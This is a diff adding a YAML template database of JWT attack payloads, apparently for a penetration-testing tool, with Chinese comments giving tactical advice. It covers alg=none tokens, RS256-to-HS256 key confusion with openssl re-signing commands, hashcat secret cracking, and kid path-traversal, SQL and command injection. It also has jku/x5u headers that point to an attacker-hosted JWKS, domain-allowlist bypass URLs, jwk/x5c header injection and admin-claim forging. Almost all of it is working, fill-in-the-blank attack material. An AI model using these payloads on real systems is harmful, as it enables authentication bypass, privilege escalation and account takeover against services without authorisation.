@@ -1,0 +1,463 @@
+ruleDB: v0.1.0
+# JWT 攻击模板。
+#
+# 载荷是**带结构的文本**，但这一门技术有一条绕不开的边界：已签名的完整 token 依赖具体
+# 密钥，工具算不出 HMAC / RSA 签名，也不该替用户去算。所以这一批只有三种形态：
+#
+#   1. 头部 / 载荷**片段**（content_type: json）—— 改完自己 base64url 回去替换对应段
+#   2. 整串 token（content_type: raw）—— 只在**不需要密钥**的 alg=none 类里给：
+#      头段是算好的 base64url（大小写变体各一份，见 alg 槽位），载荷段用变量填
+#   3. 本地重签命令（content_type: shell-command）—— 「用哪份密钥」这件事只有命令形态
+#      表达得出来：公钥文件路径、弱口令候选、产出签名段的管道
+#
+# 内容类型按载荷文本**本身的语法**选，不按效果：单独一段 header / payload 的 JSON 是
+# json（运行期会真做语法校验），拼好的整串 token 与要进 Cookie 的串是 raw。
+
+templates:
+  # ---------------------------------------------------------------- alg=none
+  # 本质是验签时没把 none 挡掉。多数库做的是**大小写敏感**的字符串比较，
+  # 所以四个拼写要逐个试——这是这一组存在的全部理由。
+
+  - id: jwt.generic.none.header
+    name: alg=none 头部
+    desc: 把原 token 的第一段换成它再 base64url 回去。四个大小写变体都值得试；服务端显式拒绝 none 时这条无效，别浪费时间
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      alg:
+        options:
+          - {id: none,       name: "全小写 none",     value: "none"}
+          - {id: none-cap,   name: "首字母大写 None", value: "None"}
+          - {id: none-upper, name: "全大写 NONE",     value: "NONE"}
+          - {id: none-mixed, name: "混合大小写 nOnE", value: "nOnE"}
+        default: none
+    body: |-
+      {"alg":"<<alg.value>>","typ":"JWT"}
+    vars: []
+    requires: [jwt-none]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.none.token
+    name: alg=none 空签名 token
+    desc: 整串 token，签名段留空但保留第三个点号。claims 填第二段的 base64url，改过 claims 就先编码再填；验签严格的实现会直接报错
+    vuln: [jwt]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      # 头段的 base64url 是算好的：换拼写就是换一份头，用户不必自己编码
+      alg:
+        options:
+          - {id: none,       name: "none", header: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"}
+          - {id: none-cap,   name: "None", header: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0"}
+          - {id: none-upper, name: "NONE", header: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0"}
+          - {id: none-mixed, name: "nOnE", header: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0"}
+        default: none
+    body: |-
+      <<alg.header>>.<<claims>>.
+    vars: [claims]
+    requires: [jwt-none]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.none.two_segment
+    name: alg=none 两段畸形 token
+    desc: 签名段连同第三个点号一起去掉的两段形态。有些实现把两段 token 当未签名的合法输入，只在这类实现上有效
+    vuln: [jwt]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      alg:
+        options:
+          - {id: none,       name: "none", header: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"}
+          - {id: none-cap,   name: "None", header: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0"}
+          - {id: none-upper, name: "NONE", header: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0"}
+          - {id: none-mixed, name: "nOnE", header: "eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0"}
+        default: none
+    body: |-
+      <<alg.header>>.<<claims>>
+    vars: [claims]
+    requires: [jwt-none]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------- 算法混淆 RS256 → HS256
+  # 前提是服务端拿同一份密钥同时当 RSA 公钥和 HMAC 密钥用。公钥是公开的，
+  # 所以拿到它就能自己签——不需要私钥。
+
+  - id: jwt.generic.confusion.header
+    name: RS256 降级 HS256 头部
+    desc: 只把 alg 改成 HS256，原 header 的 typ 和 kid 要一起保留，丢了 kid 服务端可能选不到密钥。换成它之后必须用服务端公钥重签，见 confusion.resign
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"HS256","typ":"JWT"}
+    vars: []
+    requires: [jwt-key-confusion]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.confusion.resign
+    name: RS256 降级 HS256 本地重签
+    desc: 用服务端 RSA 公钥的**文件字节**当 HMAC 密钥重签，输出签名段。公钥从 /jwks.json、/.well-known/jwks.json 或证书里取；别用去掉 PEM 头尾的裸 base64，字节对不上签名就是错的
+    vuln: [jwt]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    body: |-
+      printf '%s' "<<token>>" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(xxd -p -c 100000 <<pubkey>>) -binary | openssl base64 -A | tr '+/' '-_' | tr -d '='
+    vars: [pubkey, token]
+    requires: [jwt-key-confusion, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- 弱密钥
+  # 顺序是先爆后签：crack 出密钥，resign 出签名段。
+
+  - id: jwt.generic.weak.crack
+    name: HS256 弱密钥爆破
+    desc: 密钥是弱口令时先爆破再重签。hashcat 跑不出就换 jwt_tool 的字典模式（jwt_tool.py token -C -d 字典）；密钥本身够强时这条纯属浪费时间
+    vuln: [jwt]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    body: |-
+      hashcat -m 16500 -a 0 <<token>> /usr/share/wordlists/rockyou.txt
+    vars: [token]
+    requires: [jwt-weak-secret]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.weak.resign
+    name: HS256 弱密钥重签
+    desc: 拿到密钥后用它给 头.载荷 重签并输出签名段。候选只列了最常见的几个弱口令，没命中就换 weak.crack 爆破，别在这条上一个个手试
+    vuln: [jwt]
+    content_type: [shell-command]
+    component: []
+    version: "*"
+    slots:
+      secret: {options: ["secret", "key", "changeme", "123456"], default: "secret"}
+    body: |-
+      printf '%s' "<<token>>" | openssl dgst -sha256 -mac HMAC -macopt key:<<secret>> -binary | openssl base64 -A | tr '+/' '-_' | tr -d '='
+    vars: [token]
+    requires: [jwt-weak-secret]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------------- kid 注入
+  # 三条的共同点是 kid 被拿去拼东西：文件路径 / SQL / shell 命令。
+  # 目标是让「服务端用的密钥」变成我们知道的值。
+
+  - id: jwt.generic.kid.traversal
+    name: kid 路径穿越读空文件
+    desc: kid 被拼进密钥文件路径时，穿越到 /dev/null 让服务端读到空文件、拿空串当密钥，之后用空密钥重签。层级按实际密钥目录深度调，穿越被规范化挡掉时换 kid.sqli
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      kid:
+        options:
+          - "../../../../../../dev/null"
+          - "/dev/null"
+          - "..%2f..%2f..%2f..%2f..%2f..%2fdev%2fnull"
+        default: "../../../../../../dev/null"
+    body: |-
+      {"alg":"HS256","typ":"JWT","kid":"<<kid>>"}
+    vars: []
+    requires: [jwt-kid-inject]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.kid.sqli
+    name: kid SQL 注入换密钥
+    desc: kid 拿去查库取密钥时，用 UNION 把查询结果换成自己已知的串再重签。列数按实际查询调；查询是参数化的、或取出的密钥不参与签名时无效
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"HS256","typ":"JWT","kid":"x' UNION SELECT 'known-secret'-- -"}
+    vars: []
+    requires: [jwt-kid-inject]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.kid.cmd
+    name: kid 命令注入
+    desc: kid 被拼进 shell 命令取密钥时执行命令，命令输出会成为密钥。挑 whoami、id -u 这类输出可预知的命令，密钥才是你能算出来的值；只在实现真的走 shell 时有效，比前两条少见得多
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"HS256","typ":"JWT","kid":"|<<cmd>>"}
+    vars: [cmd]
+    requires: [jwt-kid-inject]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------------------ jku / x5u
+  # 服务端会去取 header 指定的密钥，等于把验签密钥交给我们。目标是**出网**的，
+  # 所以 requires 里 outbound 和 listener 都是必要条件，不是可选项。
+
+  - id: jwt.generic.jku.header
+    name: jku 指向自己的 JWKS
+    desc: header 里放 jku 指向 lhost 上托管的 JWKS，服务端会去取它当验签公钥。要用与那份 JWKS 配套的私钥重签（见 jku.jwks）；目标出不了网时换 jwk.header
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"RS256","typ":"JWT","kid":"<<kid>>","jku":"http://<<lhost>>/jwks.json"}
+    vars: [kid, lhost]
+    requires: [outbound, listener, jwt-jku-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.jku.jwks
+    name: 攻击者托管的 JWKS
+    desc: 配 jku 头一起用，把公钥按 JWKS 格式托管在 lhost 上，kid 要和 header 里写的一致。modulus 是模数的 base64url（openssl rsa -pubout -modulus 去掉 Modulus= 前缀再编码），填错就是验签失败
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":"<<kid>>","n":"<<modulus>>","e":"AQAB"}]}
+    vars: [kid, modulus]
+    requires: [outbound, listener, jwt-jku-open]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.x5u.header
+    name: x5u 指向自签证书
+    desc: jku 的证书版，x5u 指向自签证书，服务端从证书里提出公钥，你用配套私钥重签。有的实现只收 DER 或 PKCS7 链，PEM 被拒时换 jku.header
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"RS256","typ":"JWT","kid":"<<kid>>","x5u":"http://<<lhost>>/cert.pem"}
+    vars: [kid, lhost]
+    requires: [outbound, listener, jwt-jku-open]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------------------- JWK 头注入
+  # 与 jku 的区别是**不需要目标出网**：密钥就在 header 里，服务端直接拿它验签。
+
+  - id: jwt.generic.jwk.header
+    name: jwk 头自带密钥
+    desc: 服务端信任 header 里自带的密钥时用，不需要目标出网，比 jku 稳。RSA 选项要用自己的私钥重签，oct 选项的密钥就是你填进去的那串 base64url
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      # alg 必须和 kty 配套：RSA 公钥配 RS256、对称密钥配 HS256。
+      # 这正是「一组值必须联合选择」的场景，拆成两个槽位能拼出 RS256+oct 这种垃圾。
+      jwk:
+        options:
+          - id: rsa
+            name: "RSA 公钥（alg=RS256）"
+            alg: "RS256"
+            key: '{"kty":"RSA","use":"sig","alg":"RS256","kid":"<<kid>>","n":"<<modulus>>","e":"AQAB"}'
+          - id: oct
+            name: "对称密钥（alg=HS256）"
+            alg: "HS256"
+            key: '{"kty":"oct","alg":"HS256","k":"<<secret>>"}'
+        default: rsa
+    body: |-
+      {"alg":"<<jwk.alg>>","typ":"JWT","kid":"<<kid>>","jwk":<<jwk.key>>}
+    vars: [kid, modulus, secret]
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---------------------------------------------------------- claims 片段
+  # 这两条是 payload 段的片段，本身不构成攻击：改完 claims 还要配上一条能过验签的
+  # 头（none / 弱密钥 / 混淆 / kid），否则整串 token 一律无效。
+  # requires 留空是有意的——那几个前提是**或**关系，词表里的 requires 表达不了。
+
+  - id: jwt.generic.claims.privilege
+    name: claims 提权片段
+    desc: payload 段的提权片段，subject 是 sub 声明的值（通常是用户名或 ID），admin 按目标实际的角色字段名改（role、isAdmin、scope、groups）。改完必须 base64url 回去，再配一个能过验签的头
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"sub":"<<subject>>","admin":true}
+    vars: [subject]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: jwt.generic.claims.exp_future
+    name: claims 过期时间推到远期
+    desc: payload 段的过期时间片段，subject 填 sub 声明的值，9999999999 是 2286 年。服务端只比 exp 时最有效；它还校验 iat、nbf 或签名时间戳时，把这几项一起往后挪
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"sub":"<<subject>>","exp":9999999999}
+    vars: [subject]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------- alg 的其他取值
+  # 算法混淆不止 RS256→HS256 一种：库里「按 alg 选验签实现」的分支很多，
+  # 取值和密钥类型不匹配时可能落到没写好的分支（比如把 RSA 公钥当 EC 公钥、
+  # 或者字符串比较没做大小写归一）。
+
+  - id: jwt.generic.alg.variants
+    name: alg 取值变形
+    desc: >-
+      一条条试的清单，按下面的顺序：先试和密钥类型不匹配的族（RSA 站点试 ES256/PS256），
+      再试大小写与尾随空格——不少库做的是 `header['alg'] === 'HS256'` 这种严格比较，
+      不等号另一头往往就是「不验签」或者抛异常，两者都值得看。
+      目标显式拒绝未知 alg（白名单）时这一整条都无效。改完记得 base64url 回去替换头段。
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      alg:
+        options:
+          - {id: es256,      name: "ES256（拿 RSA 公钥当 EC 用）", value: "ES256"}
+          - {id: ps256,      name: "PS256（RSA-PSS，老库不认识）",  value: "PS256"}
+          - {id: hs512,      name: "HS512（换 HMAC 族）",          value: "HS512"}
+          - {id: lower,      name: "hs256 全小写",                 value: "hs256"}
+          - {id: trailing,   name: "HS256 尾随空格",               value: "HS256 "}
+          - {id: notyp,      name: "省略 typ",                     value: "RS256"}
+        default: es256
+    body: |-
+      {"alg":"<<alg.value>>","typ":"JWT"}
+    vars: []
+    requires: [weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------- jku 的域名白名单绕过
+
+  - id: jwt.generic.jku.allowlist
+    name: jku 的域名白名单绕过形态
+    desc: >-
+      服务端校验过 jku 的域名（允许自己家域名）时，拼一个「检查时看着像自己的、
+      取的时候落到别处」的 URL：userinfo 里的 @、fragment、以及拼在 query 里的
+      被信任域名，各自能骗过一种检查写法。配合 jku.jwks 一起用（那份 JWKS 里
+      kid 要和头里一致）。目标压根不校验域名时，直接用 jwt.generic.jku.header。
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      form:
+        options:
+          - {id: at,       name: "userinfo @ 截断", uri: "https://<<trusted>>@<<lhost>>/jwks.json"}
+          - {id: fragment, name: "fragment 里放域名", uri: "https://<<lhost>>/jwks.json#<<trusted>>"}
+          - {id: query,    name: "query 里放域名",    uri: "https://<<lhost>>/jwks.json?u=<<trusted>>"}
+          - {id: backslash, name: "反斜杠解析差异",   uri: 'https://<<trusted>>\@<<lhost>>/jwks.json'}
+        default: at
+    body: |-
+      {"alg":"RS256","typ":"JWT","kid":"<<kid>>","jku":"<<form.uri>>"}
+    vars: [kid, lhost, trusted]
+    requires: [outbound, listener, jwt-jku-open, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------- kid 的穿越深度
+  # 密钥文件放在第几层目录只有目标的部署知道，所以层级做成槽位。
+
+  - id: jwt.generic.kid.traversal.depth
+    name: kid 路径穿越（层级可调）
+    desc: >-
+      kid 被拼进密钥文件路径时，穿越到 /dev/null 让服务端读到空文件、拿空串当密钥，
+      之后用空密钥重签。层级按密钥目录的实际深度调——层数不够到不了根，
+      多了会被规范化吃掉；这也是它比固定写死六层的那条好用的地方。
+      穿越被规范化挡掉时换 kid.sqli 那条。
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    slots:
+      depth: {options: ["1", "2", "3", "4", "6", "8", "10"], default: "6"}
+      form:
+        options:
+          - {id: slash, name: "../ 明文",  seq: "../"}
+          - {id: enc,   name: "..%2f 编码", seq: "..%2f"}
+        default: slash
+    body: |-
+      {"alg":"HS256","typ":"JWT","kid":"<<rep(depth,form.seq)>><<target>>"}
+    vars: [target]
+    requires: [jwt-kid-inject]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ------------------------------------------------- x5c 头
+
+  - id: jwt.generic.x5c.header
+    name: x5c 头自带证书链
+    desc: >-
+      和 jwk.header 一样不需要目标出网：x5c 里直接放 base64 的 DER 证书，
+      服务端从证书里提出公钥验签，你用配套私钥签就行。有的库只认 DER 不认 PEM，
+      所以别把 PEM 那串贴进来（b64 是 `openssl x509 -outform DER | base64 -w0` 的结果）。
+      只在实现信任 header 提供的 x5c 时成立；只支持 jku/x5u 取密钥的实现上换那两条。
+    vuln: [jwt]
+    content_type: [json]
+    component: []
+    version: "*"
+    body: |-
+      {"alg":"RS256","typ":"JWT","kid":"<<kid>>","x5c":["<<b64>>"]}
+    vars: [kid, b64]
+    requires: [weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
